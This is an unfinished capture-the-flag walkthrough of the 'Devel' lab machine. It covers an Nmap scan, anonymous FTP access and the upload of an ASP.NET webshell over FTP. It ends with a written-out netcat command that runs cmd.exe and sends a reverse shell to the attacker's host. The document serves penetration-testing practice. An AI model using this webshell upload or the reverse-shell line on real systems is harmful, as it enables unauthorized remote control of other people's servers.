---
description: Work In Progress...
---

# Devel

## Overview

j

## Enumeration

As always we start with an Nmap scan. This is the one I ran

```bash
 sudo nmap -sV -sC 10.129.203.118 
Starting Nmap 7.92 ( https://nmap.org ) at 2022-03-23 16:45 EDT
Nmap scan report for 10.129.203.118
Host is up (0.034s latency).
Not shown: 998 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     Microsoft ftpd
| ftp-syst: 
|_  SYST: Windows_NT
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 03-18-17  01:06AM       <DIR>          aspnet_client
| 03-17-17  04:37PM                  689 iisstart.htm
|_03-17-17  04:37PM               184946 welcome.png
80/tcp open  http    Microsoft IIS httpd 7.5
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: IIS7
|_http-server-header: Microsoft-IIS/7.5
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.00 seconds
```

The scan reveals we have two services open: `Microsoft FTP` on `port 21` and `Microsoft IIS` web server on `port 80`.

### FTP

What's particularly interesting is that anonymous login is allowed on port 21 so let's explore that.

We'll make sure that anonymous login does work, which indeed it does.

![](<../../../../.gitbook/assets/image (11).png>)

However, there isn't anything useful for us here.

### IIS

We see what looks to be the default landing page for IIS

![](<../../../../.gitbook/assets/image (40).png>)

Running a dirsearch on the website also did not prove to be useful.

### Curl

I ran a curl command with `-I` to get only the document info

```bash
curl -I http://10.129.203.118/
HTTP/1.1 200 OK
Content-Length: 689
Content-Type: text/html
Last-Modified: Fri, 17 Mar 2017 14:37:30 GMT
Accept-Ranges: bytes
ETag: "37b5ed12c9fd21:0"
Server: Microsoft-IIS/7.5
X-Powered-By: ASP.NET
Date: Wed, 23 Mar 2022 21:06:06 GMT
```

Seeing that the server is running ASP.NET and I have access to FTP, I can probably upload a webshell

## Foothold

### Webshell

I decided to go with the webshell from SecLists

![](<../../../../.gitbook/assets/image (7).png>)

Now we'll upload it over ftp:

![](<../../../../.gitbook/assets/image (43).png>)

We can access our webshell by visiting `10.129.203.118/cmd.aspx`

![](<../../../../.gitbook/assets/image (24).png>)

Here's what returns when entering `whoami`

![](<../../../../.gitbook/assets/image (50).png>)

### Reverse shell

I'll be getting a shell with `nc.exe`

First I use smbserver.py to send the executable to the web server and then execute a netcat command

![](<../../../../.gitbook/assets/image (25).png>)

![](<../../../../.gitbook/assets/image (41).png>)

![](<../../../../.gitbook/assets/image (42).png>)

I also start a nc listener on my kali machine to catch a shell

![](<../../../../.gitbook/assets/image (30).png>)

Entering the following command into the webshell:

```
\\10.10.14.13\nc.exe -e cmd.exe 10.10.14.13 443
```

And I get a shell!

